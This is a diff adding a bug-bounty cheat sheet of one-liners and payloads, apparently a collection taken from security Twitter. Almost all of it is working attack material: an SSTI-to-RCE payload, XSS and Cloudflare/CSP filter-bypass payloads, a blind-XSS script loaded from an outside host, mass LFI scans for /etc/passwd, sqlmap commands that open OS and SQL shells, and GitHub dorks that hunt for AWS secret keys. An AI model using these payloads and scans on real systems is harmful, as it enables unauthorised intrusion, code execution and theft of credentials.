@@ -1,0 +1,294 @@
+sqlidetector:
+> python3 sqlidetector.py -f urls.txt -w 50 -o output.txt -t 10
+
+paramspider:
+> python3 paramspider.py --domain hackerone.com
+
+echo "shopify.com" | assetfinder --subs-only | httprobe | gau | grep '.js' | xkeys | grep -V 'Nothing'
+
+index of / site: /etc/certs + “index of /” */* site:shopify.com
+--------------------------------------------------------------
+How to use FFUF over multiple hosts
+$ for i in `cat host.txt`; do ffuf -u $i/FUZZ -w wordlist.txt -mc 200,302,401 -se ;done
+
+SSTI to RCE payload 
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("cat /home/min/user.txt")}}
+
+Finding XSS using KnoXSS API
+echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
+
+Blind XSS in Parameters
+subfinder -d http://target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+
+The best single #XSS vector you'll ever have! Payload :
+JavaScript://%250Aalert?.(1)//
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+\74k<K/contentEditable/autoFocus/OnFocus=
+/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+
+Cloudflare bypass : 
+"-top['al\x65rt']('sailay')-"
+
+Lets Automate this real quick 🔥🔥
+cat rootDomains.txt | assetfinder -subs-only | httpx -p 80,443,8080,8443,9001,9002,9003,9000 -path "/asset////////////////../../../../../../../../etc/passwd" -mr "root:x" -nc -t 50 
+
+1 - Cloudflare bypass payload: "><<svg onload=alert&#0000000040document.cookie)> blocked by CSP. 
+2-  Cloudflare + CSP bypass payload: "><<iframe onx=() onload=(alert)(6)>
+
+‘“`><img src=x>${7*7}
+
+SQL injection OneLiner:
+subfinder -dL domains.txt | dnsx | waybackurl | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+Easy way to get good vulns:
+shodan search ssl[.]cert[.]subject[.]CN:"http://target[.]com*" 200 --fields ip_str | httpx | tee ips.txt 
+nuclei -l ips.txt -o vulns.txt
+
+Get OS Shell :
+💉 sqlmap --dbms=mysql -u "http://target,com/login.php" --os-shell
+ Get SQL Shell :
+💉 sqlmap --dbms=mysql -u "http://target,com/login.php" --sql-shell
+
+Start with the most "interesting" targets 👇
+cat subdomains.txt | grep -i 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'|anew -q interesting_domains.txt
+
+Katana:
+cat domain | subfinder -d | httpx -nc -t 300 -p 80,443,8080,8443,8090,9090 -silent | katana >> sqli;  sqlmap -m sqli --batch --random-agent --level 4
+
+Find Subdomain from VirusTotal🔥 
+curl -s "https ://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
+
+Reported XSS on @Hacker0x01
+when ">" Blocked direct alert is Restricted
+Bypassed  using below payload
+<img src=x onerror=console.log(alert(1)) <
+
+XSS Payloads for Open redirect:-
+";alert(0);//
+java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0` java%09scrip%07t:prompt`0`
+
+Awesome XSS payload. Use this to bypass filter.
+"/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\\1\\)>
+
+Targets host ip:
+curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
+
+Automate your XSS:
+echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+
+How to find this LFI at scale using @pdiscoveryio's httpx? 
+cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt
+
+Full port scanning and vuln finding command: 
+rustscan -a 'hosts.txt' -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/
+
+Find hidden params in javascript files
+assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
+
+Subdomain Takeover Automation. 
+$ subfinder -d http://target.com -o target.txt
+$ subzy --targets target.txt --hide_fails 
+
+Open Redirection Automation.
+$ waybackurls http://target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I|grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+xss cloudflare bypass
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+
+Mass cname checker oneliner.
+$nano .bash_profile
+cname()
+{ for ip in $(cat $1);do dig asxf $ip | grep CNAME;done }
+$source .bash_profile
+$ cname subs.txt
+
+xss filter #bypass using chiness charator (katana)
+javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+
+Extract links from .js files! Simple regex - cat *js | grep -o -E `(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+`
+
+finding endpoints:
+cat js | grep -o -E "(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+"
+
+site:http://codepad.co "company"
+site:http://scribd.com "company"
+site:http://npmjs.com "company"
+site:http://npm.runkit.com "company"
+site:http://libraries.io "company"
+site:http://ycombinator.com "company"
+site:http://coggle.it "company"
+
+site:http://sharecode.io "company"
+site:http://pastebin.com "company"
+site:http://repl.it "company"
+site:http://productforums.google.com "company"
+site:http://gitter.im "company"
+site:http://bitbucket.org "company"
+site:*.atlassian.net "company"
+
+http://atlassian.net "company"
+inurl:gitlab "company"
+
+site:http://papaly.com "company"
+site:http://google.com "company"
+site:http://trello.com "company"
+site:http://prezi.com "company"
+site:http://jsdelivr.net "company"
+site:http://codepen.io "company"
+site:http://codeshare.io "company"
+
+site:http://atlassian.net "company"
+
+Github: Org:org_name "password"
+org:Target "bucket_name"
+org:Target "aws_access_key"
+org:Target "aws_secret_key"
+org:Target "S3_BUCKET"
+org:Target "S3_ACCESS_KEY_ID"
+org:Target "S3_SECRET_ACCESS_KEY"
+org:Target "S3_ENDPOINT"
+org:Target  "AWS_ACCESS_KEY_ID"
+org:Target  "list_aws_accounts"
+
+alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{' "
+
+Bypassed SSTI Again
+Payload: {{%% if 'ahsan' == 'ahsan' %%}} a {{%% endif %%}}
+
+Awesome XSS Testing: waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+
+LFI Trick:
+/fileRead.jsp?fileName=/etc/passwd (406📛)
+
+/fileRead.jsp?fileName=/?tc/?asswd (200✅)
+/fileRead.jsp?fileName=/??c/??sswd (200✅)
+
+I finally got ffuf to output to a text file in a decent way for automation:
+ffuf -w /tmp/wordlists.txt -u URL/FUZZ -r -ac -v &>> /tmp/output.txt ; sed -i 's/\:\: Progress.*Errors.*\:\://g' /tmp/output.txt ; sed -i 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' /tmp/output.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
